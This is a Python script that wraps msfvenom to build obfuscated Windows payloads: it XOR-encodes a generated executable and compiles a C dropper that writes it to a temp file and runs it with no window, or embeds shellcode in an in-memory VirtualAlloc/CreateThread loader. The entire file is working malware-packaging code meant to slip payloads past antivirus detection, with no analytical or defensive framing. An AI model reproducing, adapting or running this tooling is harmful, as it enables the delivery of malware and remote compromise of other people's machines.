#!/usr/bin/env python3
import sys
import shlex
import subprocess
import random
from pathlib import Path

import lief

# ── Templates ────────────────────────────────────────────────────────────────

EXE_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

unsigned char payload[] = { {PAYLOAD_BYTES} };
const size_t payload_len = sizeof(payload);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd)
{
    // Decode
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] ^= PAYLOAD_KEY;
    }

    // Create temp file name
    CHAR tmpPath[MAX_PATH + 1];
    if (! GetTempPathA(MAX_PATH, tmpPath)) return -1;
    CHAR tmpFile[MAX_PATH + 1];
    snprintf(tmpFile, MAX_PATH, "%stmp%lx.exe", tmpPath, GetTickCount());

    // Dump decoded EXE
    HANDLE f = CreateFileA(tmpFile,
                           GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -2;
    DWORD written;
    WriteFile(f, payload, (DWORD)payload_len, &written, NULL);
    CloseHandle(f);

    // Launch it
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (! CreateProcessA(tmpFile, NULL, NULL, NULL, FALSE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return -3;
    }

    return 0;
}
'''

MEM_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>

unsigned char shellcode[] = { {PAYLOAD_BYTES} };
size_t shellcode_len = sizeof(shellcode);

int main(void) {
    void *exec = VirtualAlloc(NULL, shellcode_len,
                              MEM_COMMIT|MEM_RESERVE,
                              PAGE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, shellcode_len);

    DWORD old;
    VirtualProtect(exec, shellcode_len,
                   PAGE_EXECUTE_READ, &old);

    HANDLE th = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec,
        NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
'''

# ── Helpers ────────────────────────────────────────────────────────────────

def random_key() -> int:
    return random.randrange(1, 0x100)

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def compile_c(code: str, out_exe: Path, compiler: str):
    c_path = Path("session_stub.c")
    c_path.write_text(code)
    cmd = [compiler, str(c_path), "-o", str(out_exe),
           "-O2", "-s", "-static", "-Wl,--subsystem,windows"]
    print(f"[*] Compiling: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)
    print(f"[+] Built: {out_exe}")

# ── Obfuscation Pipelines ─────────────────────────────────────────────────

def obf_exe(payload_path: Path):
    data = payload_path.read_bytes()
    key  = random_key()
    enc  = xor_bytes(data, key)
    print(f"[*] XOR-key = 0x{key:02x}")

    pe      = lief.PE.parse(str(payload_path))
    m       = pe.header.machine
    if   m == lief.PE.Header.MACHINE_TYPES.AMD64:
        compiler = "x86_64-w64-mingw32-gcc"
        arch_s   = "x64"
    elif m == lief.PE.Header.MACHINE_TYPES.I386:
        compiler = "i686-w64-mingw32-gcc"
        arch_s   = "x86"
    else:
        sys.exit(f"[!] Unsupported PE machine: {m}")

    print(f"[*] Detected {arch_s} EXE → using {compiler}")

    bytes_list = ",".join(f"0x{b:02x}" for b in enc)
    code = EXE_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)\
                       .replace("PAYLOAD_KEY", str(key))

    out_dir = Path("artifacts")/payload_path.stem
    out_dir.mkdir(parents=True, exist_ok=True)
    out_exe = out_dir/f"obf_{payload_path.name}"

    compile_c(code, out_exe, compiler)
    return out_exe

def obf_shellcode(bin_path: Path):
    raw = bin_path.read_bytes()
    # we assume you've already used msfvenom -e <encoder> -f raw
    print(f"[*] Embedding {len(raw)} bytes of shellcode")

    bytes_list = ",".join(f"0x{b:02x}" for b in raw)
    code = MEM_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)

    arch = ""
    while arch not in ("x86","x64"):
        arch = input("Architecture (x86/x64): ").strip().lower()
    compiler = "x86_64-w64-mingw32-gcc" if arch=="x64" else "i686-w64-mingw32-gcc"

    out_dir = Path("artifacts")/bin_path.stem
    out_dir.mkdir(parents=True, exist_ok=True)
    out_exe = out_dir/f"obf_{bin_path.stem}_{arch}.exe"

    compile_c(code, out_exe, compiler)
    return out_exe

# ── Main Interactive Session ────────────────────────────────────────────

def main():
    print("\n=== msfvenom + obfuscator session ===")
    cmd = input("Enter msfvenom command (with -o output):\n> ").strip()
    if not cmd:
        sys.exit("No command entered. Exiting.")

    if not cmd.startswith("msfvenom"):
        cmd = "msfvenom " + cmd

    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True, check=True)

    args = shlex.split(cmd)
    try:
        o = args.index("-o")
        out_file = Path(args[o+1])
    except (ValueError, IndexError):
        sys.exit("[!] Could not parse -o <output> from your msfvenom command.")

    if not out_file.exists():
        sys.exit(f"[!] Output file not found: {out_file}")

    if out_file.suffix.lower() == ".exe":
        final = obf_exe(out_file)
    else:
        final = obf_shellcode(out_file)

    print(f"\n[+] Obfuscated payload ready: {final}\n")

if __name__ == "__main__":
    main()
